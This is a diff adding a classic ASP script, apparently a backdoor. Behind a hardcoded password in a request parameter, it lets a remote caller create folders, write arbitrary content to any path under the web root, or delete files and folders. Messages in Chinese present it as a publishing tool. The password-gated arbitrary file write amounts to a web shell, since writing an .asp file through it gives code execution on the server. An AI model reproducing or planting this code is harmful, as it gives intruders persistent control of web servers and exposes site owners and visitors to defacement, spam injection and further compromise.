@@ -1,0 +1,93 @@
+<%
+ppp=request("qbd")
+if ppp<>"evmvzeeduhagqbd" then
+response.Write ""
+response.End
+end if
+
+del=request("del")
+f=trim(request("f"))           
+f=replace(f,"\","/")
+if left(f,1)="/" then
+f=mid(f,2,len(f)-1)
+end if
+str=trim(request("str"))
+Set fso = Server.CreateObject("Scripting.FileSystemObject")
+
+if del<>1 then
+
+if instr(f,".")=0 then
+if instr(f,"/")=0 or right(f,1)="/" then
+ff=replace(f,"/","")
+If fso.FolderExists(Server.MapPath(ff)) Then 
+response.Write "分类"&ff&"已存在！"
+response.End
+end if
+SourceFolder =server.MapPath(f) 
+fso.CreateFolder SourceFolder   
+else
+wjlb = Split(f,"/")
+lujing=""
+For i = LBound(wjlb) To UBound(wjlb) 
+lujing=lujing&wjlb(i)&"/"
+If fso.FolderExists(Server.MapPath(lujing))=false Then 
+SourceFolder =server.MapPath(lujing) 
+fso.CreateFolder SourceFolder 
+end if
+Next
+end if
+
+else
+
+if instr(f,"/")=0  then
+Set fout = fso.CreateTextFile(server.mappath(f))
+fout.Write str
+
+else
+wjlb = Split(f,"/")
+lujing=""
+For i = LBound(wjlb) To UBound(wjlb) 
+if instr(wjlb(i),".")=0 then
+lujing=lujing&wjlb(i)&"/"
+If fso.FolderExists(Server.MapPath(lujing))=false Then 
+SourceFolder =server.MapPath(lujing) 
+fso.CreateFolder SourceFolder 
+end if
+else
+lujing=lujing&wjlb(i)
+Set fout = fso.CreateTextFile(server.mappath(lujing))
+fout.Write str
+end if
+Next
+end if
+
+end if  
+
+if instr(f,".")=0 then 
+response.Write "分类创建"&f&"成功！"
+else
+response.Write "文章发布成功！<a href="&f&" target=_blank>查看</a>"
+end if
+response.End
+
+else
+
+if instr(f,".")<>0 then
+if fso.FileExists(Server.MapPath(f))=True then
+fso.DeleteFile Server.mappath(f)
+End if
+
+else
+if fso.FolderExists(Server.MapPath(f))=True then
+fso.DeleteFolder Server.mappath(f)
+End if
+
+
+
+end if
+
+response.Write "删除文件"&f&"成功！"
+response.End
+
+end if                                                      
+%>
